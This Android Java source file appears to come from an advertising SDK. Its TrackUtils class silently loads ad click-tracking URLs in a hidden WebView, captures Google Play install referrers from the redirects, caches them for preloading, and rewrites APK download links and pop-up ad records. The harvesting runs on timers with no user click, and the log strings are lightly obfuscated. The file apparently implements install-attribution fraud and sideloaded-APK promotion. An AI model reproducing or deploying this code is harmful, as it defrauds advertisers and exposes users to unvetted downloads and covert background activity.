package com.curtain.koreyoshi.business.gptracker;

import android.content.Context;
import android.net.Uri;
import android.text.TextUtils;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.common.crypt.ByteCrypt;
import com.curtain.arch.MyLog;
import com.curtain.koreyoshi.business.gptracker.db.ReferDao;
import com.curtain.koreyoshi.business.gptracker.db.TrackSetting;
import com.curtain.koreyoshi.init.Config;
import com.curtain.koreyoshi.init.Constants;
import com.curtain.koreyoshi.business.popad.PopAdManager;
import com.curtain.koreyoshi.bean.AdData;
import com.curtain.koreyoshi.data.StrategySharedPreference;

import java.net.URLDecoder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by yangzheng on 15/10/27.
 */
public class TrackUtils {

    private static final boolean DEBUG_TRACK = Config.TRACK_LOG_ENABLE;

    private static final String[] STRING_GPURL = { ByteCrypt.getString("play.google.com".getBytes()),
            ByteCrypt.getString("market.android.com".getBytes()) };
    private static final String STRING_MARKETTITLE = ByteCrypt.getString("market://".getBytes());

    //临时数据
    //public static final long LONG_ONEHOUR = 60 * 60 * 1000;

    public static final long REFERSTORETIME = 10;

    public static final long PRELOADTIMEOUT = 40 * 1000;

    public static final int PRELOADREFERMAXFAILTIME = 5;

    public static final int RESETINTERVAL = 3;//单位是天

    public static final long PRELOADREFER_INTERVAL = 1;//一个小时，后面改成服务器下发的数据

    private static final boolean isEmptyRefer(String refer)
    {
        if(refer == null || "".equals(refer.trim()))
        {
            return true;
        }
        return false;
    }

    private static final boolean isNotEmptyRefer(String refer)
    {
        return !isEmptyRefer(refer);
    }

    /**
     * 是否refer在有效期
     * @param context
     * @param referData
     * @return
     */
    public static boolean isValidityRefer(Context context,ReferData referData)
    {
        if(referData != null)
        {
            long WhenTracked = referData.getWhenTracked();

            double interval = StrategySharedPreference.getReferExpired(context);

            if(interval == 0)
            {
                interval = REFERSTORETIME;
            }

            long currentTime = System.currentTimeMillis();

            if(currentTime - WhenTracked < interval * Constants.HOUR)
            {
                return true;
            }

        }
        return false;
    }

    /**
     * 是否请求超时
     * @param context
     * @param referData
     * @return
     */
    public static boolean isRequestReferOverTime(Context context,ReferData referData)
    {
        if(referData != null)
        {
            long WhenTracked = referData.getWhenTracked();

            long overTime = StrategySharedPreference.getTrackTimeOut(context)*1000;

            long currentTime = System.currentTimeMillis();


            if(currentTime - WhenTracked > overTime)
            {
                return true;
            }
            else
            {
                return false;
            }

        }
        return false;
    }

    /**
     * 是否错误超限
     * @param context
     * @param referData
     * @return
     */
    public static boolean isOverFailTime(Context context,ReferData referData)
    {

        if(referData != null)
        {
            reSetFailTime(context,referData);

            int fail = referData.getFailTime();

            if(fail >= PRELOADREFERMAXFAILTIME)
            {
                return true;
            }
            return false;
        }
        return false;
    }

    /**
     * 是否充值失败次数
     * @return
     */
    public static void reSetFailTime(Context context,ReferData referData)
    {
        if(referData != null)
        {
            long time = System.currentTimeMillis();

            long whentracked = referData.getWhenTracked();

            if(time - whentracked > RESETINTERVAL * Constants.DAY)//可以清空referData的失败次数了
            {
                referData.setFailTime(0);
                ReferDao.getReferDaoInstance(context).addRefer(referData);
            }
        }
    }

    /**
     * 是否到了fetch的时间
     * @param context
     * @return
     */
    public static boolean isFetchTime(Context context)
    {
        long lastFetchTime  = TrackSetting.getLastFectchTime(context);

        long now = System.currentTimeMillis();

        double interval = StrategySharedPreference.getReferInterval(context);

        if (interval == 0 )
        {
            interval = PRELOADREFER_INTERVAL;
        }

        if(lastFetchTime ==0 || now - lastFetchTime > interval * Constants.HOUR)
        {
            return true;
        }
        return false;
    }

    /**
     * 获取本地存储的referData数据，可能为空
     * @param context
     * @param key
     * @param packageName
     * @return
     */
    public static ReferData getReferData(Context context,String key,String packageName)
    {
        ReferData referData = new ReferData();
        referData.setKey(key);
        referData.setPackageName(packageName);
        return ReferDao.getReferDaoInstance(context).isReferExists(referData);
    }

    /**
     * 判断本地是否有有效refer
     * @param context
     * @param adData
     * @return
     */
    public static boolean hasLocalRefer(Context context,AdData adData)
    {
        ReferData referData = getReferData(context,adData.getKey(),adData.getPackageName());

        if(referData == null) {
            return false;
        }
        else {
            if (isNotEmptyRefer(referData.getRefer())) {
                if (isValidityRefer(context, referData)) {
                    return true;
                }
            }
        }
        return false;
    }
    /**
     * 是否需要获取refer
     * @param context
     * @param packageName
     * @return
     */
    public static boolean isNeedGetReferrer(Context context,String key,String packageName)
    {
        try
        {
            ReferData referData = getReferData(context, key, packageName);
            if(null == referData) {
                return true;
            }
            else {
                String refer = referData.getRefer();
                if(isEmptyRefer(refer)) {
                    if(isRequestReferOverTime(context,referData)) {
                        if(DEBUG_TRACK) {
                            MyLog.i(ByteCrypt.getString("failed time too many, ignore this item: ".getBytes()) + referData);
                        }
                        return true;
                    }
                    return false;
                }
                else {
                    if(isValidityRefer(context, referData)) {
                        if(DEBUG_TRACK) {
                            MyLog.i(ByteCrypt.getString("a valid refer already stored in local : ".getBytes()) + referData);
                        }
                        return false;
                    }
                    return true;
                }
            }
        }catch(Exception e)
        {
            if (DEBUG_TRACK)
                MyLog.printException(e);
        }
        return false;
    }

    /**
     * 保存reffer
     * @param context
     * @param packageName
     * @param referrer
     * @return
     */
    protected static boolean storeReferrer(Context context,String key,String packageName,String referrer)
    {
        boolean isOk = true;
        try{
            ReferData referData = new ReferData();
            referData.setKey(key);
            referData.setPackageName(packageName);
            referData.setRefer(referrer);
            referData.setWhenTracked(System.currentTimeMillis());
            ReferData oldRefer = ReferDao.getReferDaoInstance(context).isReferExists(referData);
            if(oldRefer != null)
            {
                referData.setFailTime(oldRefer.getFailTime());
                //如果referrer为空，说明他没有取到新的refer,就把上次的设回去
                if (TextUtils.isEmpty(referrer)){
                    referData.setRefer(oldRefer.getRefer());
                }
            }

            ReferDao.getReferDaoInstance(context).addRefer(referData);
        }catch(Exception e) {
            if (DEBUG_TRACK)
                MyLog.printException(e);
            isOk = false;
        }
        return isOk;
    }

    /**
     * 获取refer失败时，调用这个保存refer
     * @param context
     * @param key
     * @param packageName
     */
    protected static void addReferrerFailTime(Context context,String key,String packageName)
    {
        try{
            ReferData referData = new ReferData();
            referData.setKey(key);
            referData.setPackageName(packageName);
            referData.setWhenTracked(System.currentTimeMillis());
            ReferData oldRefer = ReferDao.getReferDaoInstance(context).isReferExists(referData);
            if(oldRefer != null)//添加失败信息，不用更新whenTracked属性
            {
                referData.setFailTime(oldRefer.getFailTime() + 1);
                //本次获取refer失败后，还可以保存上次获取的refer
                referData.setRefer(oldRefer.getRefer());
                referData.setWhenTracked(oldRefer.getWhenTracked());
            }
            if (DEBUG_TRACK)
            MyLog.i(ByteCrypt.getString("addReferFailTime time = ".getBytes())
                    + referData.getFailTime()
                    + ByteCrypt.getString(",".getBytes())
                    + referData
                    + ByteCrypt.getString(" ;whenTracked =".getBytes())
                    + referData.getWhenTracked());
            ReferDao.getReferDaoInstance(context).addRefer(referData);
        }catch (Exception e)
        {
            if (DEBUG_TRACK)
                MyLog.printException(e);
        }
    }


    /**
     * 是否为GP链接
     * @param url
     * @return
     */
    protected static boolean isMarketUrl(String url)
    {
        if (url.startsWith(STRING_MARKETTITLE)) {
            return true;
        }
        for (int i = 0; i < STRING_GPURL.length; i++) {
            if (url.contains(STRING_GPURL[i])) {
                return true;
            }
        }
        return false;
    }

    /**
     * 获取refferrer相关信息，下标0为包名，1为referrer
     * @param data
     * @return
     */
    protected static String[] getAnalysisedRefInfo(String data)
    {
        String info[] = {"",""};
        try{
            final String PATTERN_ID = "id=([^&]*)";
            final String PATTERN_REFER = "referrer=([^&]*)";

            Pattern pattern = Pattern.compile(PATTERN_ID,
                    Pattern.CASE_INSENSITIVE);
            Matcher matcher = pattern.matcher(data);
            if (matcher.find()) {
                String pName = matcher.group(1);

                info[0] = pName;
            }

            pattern = Pattern.compile(PATTERN_REFER, Pattern.CASE_INSENSITIVE);
            matcher = pattern.matcher(data);
            if (matcher.find()) {
                String referrer = matcher.group(1);
                referrer = URLDecoder.decode(referrer, "utf-8");
                info[1] = referrer;
            }
        }catch (Exception e)
        {
            if (DEBUG_TRACK)
                MyLog.printException(e);
        }
        return info;
    }

    public static boolean isDownloadUrl(String url)
    {
        if(url!=null && !url.trim().equals(""))
        {
            Uri uri = Uri.parse(url);
            if (uri != null)
            {
                String lastPathSegment = uri.getLastPathSegment();
                if (lastPathSegment != null && !lastPathSegment.trim().equals("")){
                    return lastPathSegment.endsWith(ByteCrypt.getString(".apk".getBytes()));
                }
            }
        }
        return false;
    }
    /**
     *用webview获取referrer
     * @param context
     * @param adData
     * @return
     */
    public static boolean getReferrerByWebView(final Context context,final AdData adData,final ReferThread t)
    {
        boolean isOk = false;
        try
        {
            final String trackUrl = adData.getClickTrackUrl();
            final String pname = adData.getPackageName();
            WebView webView = new WebView(context);
            WebSettings webSettings = webView.getSettings();
            webSettings.setJavaScriptEnabled(true);
            webSettings.setAllowFileAccess(true);
            webSettings.setBuiltInZoomControls(true);

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (url != null) {
                        if (TrackUtils.isMarketUrl(url)) {
                            String info[] = TrackUtils
                                    .getAnalysisedRefInfo(url);
                            String newpname = info[0];
                            TrackUtils.storeReferrer(context, adData.getKey(), newpname, info[1]);
                            if(!info[0].equals(adData.getPackageName())){
                                String downloadUrl = adData.getTargetUrl();
                                int start = downloadUrl.lastIndexOf(ByteCrypt.getString("/".getBytes()));
                                int end = downloadUrl.lastIndexOf(ByteCrypt.getString(".apk".getBytes()));
                                String temp = downloadUrl.substring(start+1,end);
                                downloadUrl = downloadUrl.replace(temp,newpname);
                                MyLog.e(TrackUtils.class.getSimpleName(),
                                        ByteCrypt.getString("rename pname :".getBytes())
                                        + adData.getPackageName()
                                        + ByteCrypt.getString("to: ".getBytes())
                                        +newpname);
                                MyLog.e(TrackUtils.class.getSimpleName(),
                                        ByteCrypt.getString("rename url :".getBytes())
                                        + adData.getTargetUrl()
                                        + ByteCrypt.getString("to: ".getBytes())
                                        +downloadUrl);
                                PopAdManager.getInstance(context).updateAdPname(adData,newpname);
                                PopAdManager.getInstance(context).updateAdTargetUrl(adData,downloadUrl);
                            }

                            ReferData re = TrackUtils.getReferData(context, adData.getKey(), info[0]);//用pname去查找refer

                            if (re != null) {
                                if (DEBUG_TRACK)
                                    MyLog.i(ByteCrypt.getString("getReferrerByWebView pname = ".getBytes())
                                            + info[0]
                                            + ByteCrypt.getString(" , referrer = ".getBytes())
                                            + info[1]
                                            + ByteCrypt.getString("  ,key = ".getBytes())
                                            + adData.getKey());
                            }


                            if (t != null && t.getState() == Thread.State.TIMED_WAITING && t.isSameReferKey(adData.getKey())) {
                                t.interrupt();
                            }
                        }
                    }
                    return super.shouldOverrideUrlLoading(view, url);
                }

                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                }

                @Override
                public void onReceivedError(WebView view, int errorCode,
                                            String description, String failingUrl)
                {

                    if (failingUrl != null) {
                        if (TrackUtils.isMarketUrl(failingUrl)) {
                            String info[] = TrackUtils
                                    .getAnalysisedRefInfo(failingUrl);
                            String pname = info[0];
                            TrackUtils.storeReferrer(context, adData.getKey(), pname, info[1]);
                            if(!info[0].equals(adData.getPackageName())){
                                String downloadUrl = adData.getTargetUrl();
                                int start = downloadUrl.lastIndexOf("/");
                                int end = downloadUrl.lastIndexOf(".apk");
                                String temp = downloadUrl.substring(start+1,end);
                                downloadUrl = downloadUrl.replace(temp,pname);
                                MyLog.e(TrackUtils.class.getSimpleName(),
                                        ByteCrypt.getString("rename pname :".getBytes())
                                        + adData.getPackageName()
                                        + ByteCrypt.getString("to: ".getBytes())
                                        +pname);
                                MyLog.e(TrackUtils.class.getSimpleName(),
                                        ByteCrypt.getString("rename url :".getBytes())
                                                + adData.getTargetUrl()
                                                + ByteCrypt.getString("to: ".getBytes())
                                                +downloadUrl);
                                PopAdManager.getInstance(context).updateAdPname(adData,pname);
                                PopAdManager.getInstance(context).updateAdTargetUrl(adData,downloadUrl);
                            }

                            ReferData re = TrackUtils.getReferData(context, adData.getKey(), info[0]);//用pname去查找refer

                            if (re != null) {
                                if (DEBUG_TRACK)
                                    MyLog.i(ByteCrypt.getString("getReferrerByWebView pname = ".getBytes())
                                            + info[0]
                                            + ByteCrypt.getString(" , referrer = ".getBytes())
                                            + info[1]
                                            + ByteCrypt.getString("  ,key = ".getBytes())
                                            + adData.getKey());
                            }


                            if (t != null && t.getState() == Thread.State.TIMED_WAITING && t.isSameReferKey(adData.getKey())) {
                                t.interrupt();
                            }
                        }
                    }
                    super.onReceivedError(view, errorCode, description,
                            failingUrl);
                }
            });
            if(DEBUG_TRACK)
                MyLog.i(ByteCrypt.getString("getReferrerByWebView pname =".getBytes())
                        + pname
                        + ByteCrypt.getString(",loardUrl = ".getBytes())
                        + trackUrl);
            webView.loadUrl(trackUrl);
        }catch (Exception e)
        {
            if (DEBUG_TRACK)
            MyLog.printException(e);
        }
        return isOk;
    }


}
